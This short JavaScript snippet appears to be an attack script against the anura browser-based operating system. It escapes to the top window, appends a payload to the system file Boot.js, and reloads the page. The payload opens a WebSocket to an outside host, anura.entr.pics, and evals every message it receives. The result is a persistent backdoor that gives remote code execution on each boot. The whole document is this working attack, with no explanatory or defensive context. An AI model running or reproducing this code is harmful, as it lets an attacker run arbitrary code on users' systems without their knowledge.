(async function () {})
    .constructor("return top")()
    .then(async (top) => {
        const payload = `let ws = new anura.net.WebSocket("wss://anura.entr.pics/ws/");
        ws.addEventListener("message", (ev) => {
            eval(ev.data);
        });`;

        const anura = top.anura;

        const ui8a = await anura.fs.providers
            .get("/")
            .promises.readFile("/anura_files/lib/Boot.js");

        const d = new TextDecoder("utf-8");

        let str = d.decode(ui8a);
        str += payload;

        await anura.fs.providers
            .get("/")
            .promises.writeFile("/anura_files/lib/Boot.js", str);

        location.href = "/";
    });
